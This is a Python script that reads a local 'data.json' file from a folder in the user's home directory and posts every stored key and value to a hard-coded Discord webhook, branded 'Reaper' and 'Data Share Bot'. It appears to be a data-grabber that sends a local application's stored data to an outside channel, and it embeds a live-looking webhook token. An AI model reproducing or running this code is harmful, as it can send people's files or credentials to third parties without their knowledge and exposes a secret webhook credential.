import os
import json
import requests
from datetime import datetime

# ================= CONFIG =================
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456209686000046182/tN2eQ-FYge1Le8RV0Vgko04oVD3p2jV0aLvQL5DZvjBOsSBFQh7y0gqNkIpzSft8BIFD"

DATA_FILE = os.path.join(
    os.path.expanduser("~"),
    "b2ki-ados",
    "data.json"
)

MAX_FIELD_LENGTH = 1024  # Discord limit
# =========================================

# ensure folder exists
os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)


def load_data():
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print("❌ Failed to read data.json:", e)
        return None


def flatten_json(data, parent_key=""):
    items = []
    if isinstance(data, dict):
        for k, v in data.items():
            new_key = f"{parent_key}.{k}" if parent_key else k
            items.extend(flatten_json(v, new_key))
    elif isinstance(data, list):
        for i, v in enumerate(data):
            new_key = f"{parent_key}[{i}]"
            items.extend(flatten_json(v, new_key))
    else:
        items.append((parent_key, str(data)))
    return items


def build_embed(fields):
    return {
        "title": "📁 data.json — Full Dump",
        "description": "Every stored key & value",
        "color": 0x2F3136,
        "fields": fields,
        "footer": {
            "text": "Auto Share System • Reaper"
        },
        "timestamp": datetime.utcnow().isoformat()
    }


def send_webhook(flat_data):
    embeds = []
    fields = []

    for key, value in flat_data:
        if len(value) > MAX_FIELD_LENGTH:
            value = value[:MAX_FIELD_LENGTH - 3] + "..."

        fields.append({
            "name": key or "root",
            "value": value or "null",
            "inline": False
        })

        if len(fields) == 25:
            embeds.append(build_embed(fields))
            fields = []

    if fields:
        embeds.append(build_embed(fields))

    payload = {
        "username": "Data Share Bot",
        "embeds": embeds
    }

    r = requests.post(WEBHOOK_URL, json=payload)

    if r.status_code in (200, 204):
        print("✅ data.json FULLY sent to webhook")
    else:
        print(f"❌ Webhook failed ({r.status_code})")
        print(r.text)


if __name__ == "__main__":
    data = load_data()
    if data:
        flattened = flatten_json(data)
        send_webhook(flattened)